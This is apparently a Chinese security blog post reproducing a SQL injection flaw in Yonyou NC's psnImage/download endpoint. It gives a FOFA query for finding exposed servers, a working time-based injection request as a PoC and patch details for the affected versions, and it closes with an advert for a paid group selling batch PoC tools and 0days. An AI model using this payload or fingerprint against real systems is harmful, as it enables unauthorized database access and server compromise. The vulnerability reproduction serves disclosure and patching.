#  「漏洞复现」用友NC psnImage/download SQL注入漏洞   
冷漠安全  冷漠安全   2024-08-19 15:26  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。  
  
0x03  
  
**漏洞威胁**  
  
用友NC/portal/pt/psnImage/download 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
影响范围：  
  
NC63、NC633、NC65  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
icon_hash="1085941792"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qkxLdlug76YA34AlMEUJCMOZBJ7m8iac3Gv4vAqLicOml9ibX27UU7ok7m0UILoQicbvw6ZemVmCtrqg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),8)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qkxLdlug76YA34AlMEUJCMeqlIjVUOeOpELFYcZZic6qhkialibibzotKwHCEdybOVeOjqvkHMqicmAUQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qkxLdlug76YA34AlMEUJCMU408IgywmOAMrcaftO9ealgAc51sbicBVAW1Sjw0OqOXKibG2fZoDV7w/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
打对应补丁，重启服务，各版本补丁获取方式如下：  
  
NC63方案  
  
补丁名称：patch_63_psnImage安全补丁SQL注入  
  
补丁编码：NCM_NC6.3_000_109902_20240808_GP_104414389  
  
校验码：  
  
807aff00908bfd3fe6c1a589eef1d580fac1b9433b42af6be986372b448dbc82  
  
NC633方案  
  
补丁名称：patch_633_psnImage安全补丁SQL注入  
  
补丁编码：NCM_NC6.33_000_109902_20240808_GP_104448439  
  
校验码：  
  
07cce96bcb8a84a6852542578d381ab8d1004d2151124bbd5698c8bd1099d214  
  
NC65方案  
  
补丁名称：patch_65_psnImage安全补丁SQL注入  
  
补丁编码：NCM_NC6.5_000_109902_20240808_GP_104470236  
  
校验码：  
  
6e1a66f03d5bb61514c459f5ba4358f51b27e40f2d1fbccdf87a57e777e42d16  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qkxLdlug76YA34AlMEUJCMpdSPyG09k4AsOBCDkbxaqbqHX3qUskb9budgibDhV3NRtNNklsicPbCA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qkxLdlug76YA34AlMEUJCMd7AfQ8Q1qQzoc6uIP0xFdcF8RZVPefplaicQERQHCE0o7vdD0T1iaypQ/640?wx_fmt=gif&from=appmsg "")  
  
  
